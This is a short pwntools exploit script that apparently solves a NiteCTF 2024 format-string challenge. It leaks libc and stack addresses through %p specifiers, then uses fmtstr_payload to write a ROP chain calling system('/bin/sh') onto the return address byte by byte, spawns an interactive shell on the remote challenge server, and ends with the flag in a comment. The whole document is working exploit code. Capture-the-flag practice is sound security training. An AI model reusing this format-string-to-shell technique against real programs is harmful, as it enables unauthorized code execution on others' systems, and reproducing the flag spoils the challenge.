#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./chall_patched", checksec=False)
context.binary = elf

libc = ELF("./libc.so.6", checksec=False)

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("print-the-gifts.chals.nitectf2024.live", 1337, ssl=True)

p.sendlineafter(b">", b"%43$p")
p.readuntil(b"Santa brought you a ")
leak = int(p.readline().decode(), 16)
libc.address = leak - 0x27305
log.success(f"libc: {hex(libc.address)}")
p.sendlineafter(b"y or n:\n", b"y")

p.sendlineafter(b">", b"%1$p")
p.readuntil(b"Santa brought you a ")
leak = int(p.readline().decode(), 16)
retaddr = leak + 0x21a8
log.success(f"ret: {hex(retaddr)}")

rop = ROP(libc)
rop.rdi = p64(next(libc.search(b"/bin/sh\x00")))
rop.raw(p64(rop.find_gadget(['ret']).address)) # stack aligning ret
rop.call("system")
payload = rop.chain()

for i in range(len(payload)):
    p.sendlineafter(b"y or n:\n", b"y")
    p.sendlineafter(b">", fmtstr_payload(8, {retaddr + i: p8(payload[i])}))
    
p.sendlineafter(b"y or n:\n", b"n")

p.interactive() # nite{0nLy_n4ugHty_k1d5_Use_%n}
